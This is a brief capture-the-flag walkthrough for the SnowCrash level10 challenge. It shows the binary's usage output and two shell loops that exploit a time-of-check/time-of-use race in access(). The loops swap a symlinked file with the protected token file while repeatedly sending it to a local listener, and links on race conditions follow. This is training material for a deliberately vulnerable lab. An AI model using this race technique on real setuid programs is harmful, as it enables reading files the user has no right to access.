## Walkthrough :

+ i started by executing **./level10**, this prints the usage 
```
level10@SnowCrash:~$ ./level10
./level10 file host
	sends file to host if you have access to it
```
```
%s file host
	sends file to host if you have access to it
Connecting to %s:6969 ..
Unable to connect to host %s
``` 

```
#!/bin/sh

while true
do
	mv token tmp
	mv file token
	mv tmp file
done
```

```
#!/bin/sh

while true
do
	./level10 file 0.0.0.0
done
```


## Ressources :
[race condition](https://web.ecs.syr.edu/\~wedu/Teaching/IntrCompSec/LectureNotes_New/Race_Condition.pdf)
[access() Security Hole](https://stackoverflow.com/questions/7925177/access-security-hole)